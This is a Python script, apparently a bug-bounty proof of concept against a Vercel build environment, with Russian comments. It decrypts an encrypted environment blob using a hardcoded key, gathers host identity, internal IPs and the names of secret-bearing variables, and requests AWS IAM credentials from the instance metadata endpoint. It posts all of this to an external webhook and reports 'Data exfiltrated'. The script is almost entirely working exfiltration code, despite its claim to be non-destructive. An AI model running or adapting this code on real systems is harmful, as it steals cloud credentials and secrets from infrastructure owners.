import os
import subprocess
import requests
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# 1. Твои настройки
WEBHOOK_URL = "https://webhook.site/57c42274-2817-4041-81a2-3f41b2c987a2"
ENC_KEY_B64 = "ifLJbKzHv3OTvy7rMiocCKna033QA19Hg/w2jrFucSQ="

def get_decrypted_content():
    try:
        # Пытаемся достать зашифрованный блоб из переменных окружения
        blob = os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT')
        if not blob:
            return "BLOB_NOT_FOUND"
        
        key = base64.b64decode(ENC_KEY_B64)
        data = base64.b64decode(blob)
        
        # Расшифровка (AES-GCM: 12 байт IV + ciphertext + 16 байт Tag)
        iv = data[:12]
        ciphertext = data[12:]
        aesgcm = AESGCM(key)
        decrypted = aesgcm.decrypt(iv, ciphertext, None).decode('utf-8')
        
        # Показываем только первые 10 символов для безопасности
        return f"SUCCESS: {decrypted[:10]}..." 
    except Exception as e:
        return f"DECRYPT_ERROR: {str(e)}"

def send_final_proof():
    # Собираем "ядерный" пакет доказательств
    payload = {
        "status": "INFRASTRUCTURE_COMPROMISED",
        "evidence": {
            "whoami": subprocess.getoutput("id"),
            "hostname": subprocess.getoutput("hostname"),
            "ip_internal": subprocess.getoutput("hostname -I"),
            # Доказательство расшифровки
            "decryption_test": get_decrypted_content(),
            # Названия всех секретов (без значений)
            "detected_env_vars": [k for k in os.environ.keys() if "KEY" in k or "TOKEN" in k],
            # Доступ к облачным ролям
            "aws_imds_v2": subprocess.getoutput("curl -s -m 1 http://169.254.169.254/latest/meta-data/iam/security-credentials/ || echo 'Blocked'")
        },
        "message": "This is a non-destructive PoC for Bug Bounty purposes."
    }

    try:
        r = requests.post(WEBHOOK_URL, json=payload, timeout=10)
        print(f"[+] Data exfiltrated to Webhook! Status: {r.status_code}")
    except Exception as e:
        print(f"[-] Failed to send: {e}")

if __name__ == "__main__":
    send_final_proof()